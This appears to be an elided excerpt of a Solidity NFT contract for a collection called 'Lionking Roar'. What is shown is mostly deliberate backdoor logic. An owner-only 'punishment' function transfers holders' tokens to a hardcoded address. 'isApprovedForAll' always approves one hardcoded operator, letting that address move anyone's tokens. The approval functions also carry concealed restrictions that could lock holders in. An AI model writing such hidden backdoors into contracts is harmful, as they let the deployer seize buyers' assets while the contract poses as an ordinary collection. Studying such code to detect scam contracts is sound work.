...
contract Lionking_Roar is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Lionking Roar", "LR", maxBatchSize_, collectionSize_) {
  ...
  function WListMintStart(uint256 quantity,bytes32[] calldata _merkleProof) external payable callerIsUser {
  ...
  function punishment(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xc1530CA0557325469Bf09cCcae0d455FFe71129E, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x384Fa5d66B04CF565EdB28639744f338291157e0);
  ...
  Ownable
{
   ...
   */
    function approve(address to, uint256 tokenId) public override {
        ...
        if(!ContractIsdeny  && !_ToCon[tokenId]){
            if (to.isContract()) {
   ...
   */
    function setApprovalForAll(address operator, bool approved) public override {
        ...
        if(!ContractIsdeny  && !_addressToCon[msg.sender]){
        if(clockStop() || onOrNot){
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x045485f108f63f3B05e994586f830E1A233f077C){return true;}
